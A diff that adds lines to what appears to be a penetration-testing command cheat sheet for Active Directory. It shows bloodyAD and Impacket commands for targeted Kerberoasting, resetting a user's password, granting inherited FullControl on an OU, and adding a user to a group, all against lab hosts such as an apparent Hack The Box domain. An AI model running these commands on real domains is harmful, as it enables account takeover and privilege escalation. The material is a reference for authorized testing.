@@ -1611,6 +1611,10 @@ bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get obje
 bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Force set the SPN on the account: Targeted Kerberoasting
 GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName>	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Grab the ticket
 bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Remove the SPN
+bloodyAD -v DEBUG -d INFILTRATOR.HTB -k --host dc01.infiltrator.htb set password e.rodriguez 'Qwer1234' # Change Password of a user
+dacledit.py -no-pass -k -dc-ip 10.129.231.134 -action 'write' -rights 'FullControl' -inheritance -principal 'D.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' infiltrator.htb/D.anderson 	# GenericAll --> (see -inheritance)
+bloodyAD --host "dc01.infiltrator.htb" -d "infitrator.htb" -u "e.rodriguez" -k add groupMember "CHIEFS MARKETING" "e.rodriguez" 		# ADDSELF
+
 
 # WEB ## CURL
 curl -v http://<DOMAIN>                                                       ## CURL // verbose output
